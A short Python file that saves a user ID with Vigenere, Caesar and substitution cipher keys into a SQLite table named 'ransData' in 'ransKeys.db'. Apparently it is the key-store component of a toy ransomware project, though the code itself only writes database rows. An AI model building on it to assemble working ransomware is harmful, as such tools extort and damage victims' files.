import _sqlite3
from _sqlite3 import connect
  
c = None  # @IndentOk

def addTodatabase(UserID, VigienerK, CaesarK, SubK):
   global c
   conn = connect('ransKeys.db')
   c = conn.cursor()
   
   
   
   
     
   
   c.execute('CREATE TABLE IF NOT EXISTS ransData(UserID REAL, VigienierK TEXT, CaesarK REAL, SubK TEXT)')    
   
   params = ( UserID, VigienerK, CaesarK, SubK)

   c.execute("INSERT INTO ransData VALUES (?, ?, ?, ?)", params)
   
  
   conn.commit()
   


  